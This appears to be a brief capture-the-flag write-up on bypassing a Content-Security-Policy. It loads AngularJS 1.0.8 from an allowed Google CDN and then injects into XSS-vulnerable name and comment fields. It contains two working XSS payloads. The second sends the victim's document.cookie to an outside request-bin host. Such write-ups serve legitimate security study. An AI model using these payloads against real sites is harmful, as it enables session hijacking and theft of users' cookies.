# csp

On the second page, name and comment are vulnerable to XSS.

The CSP header is:

```http
Content-Security-Policy
    default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none'
```

We can download the angular.js file from `https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js` and then use the following payload to bypass the CSP:

```html
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp id=p ng-click={{constructor.constructor("alert(1)")()}}>
```

To get the flag, we can use the following payload:

```html
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp id=p ng-click={{constructor.constructor("window.location.href='https://some.request.bin.site?cookie='+document.cookie")()}}>
```
